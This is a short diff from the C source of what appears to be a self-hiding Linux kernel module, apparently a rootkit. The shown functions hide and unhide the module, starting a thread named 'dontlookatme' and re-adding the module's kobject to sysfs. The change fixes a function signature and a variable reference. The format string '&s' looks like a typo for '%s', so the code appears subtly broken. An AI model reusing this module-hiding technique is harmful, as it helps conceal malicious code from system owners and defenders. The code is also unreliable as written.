@@ -54,9 +54,9 @@ void hide_code(void){
 	kthread_run(hiding_thread, NULL, "dontlookatme");
 }
 
-void make_module_removable(){
+void make_module_removable(void){
 	THIS_MODULE->mkobj.kobj = tmp_kobj;
-	kobject_add(&mod->mkobj.kobj, mod->mkobj.kobj.parent, "&s", mod->mkobj.kobj.name);
+	kobject_add(&THIS_MODULE->mkobj.kobj, THIS_MODULE->mkobj.kobj.parent, "&s", THIS_MODULE->mkobj.kobj.name);
 }
 
 void unhide_code(void) {
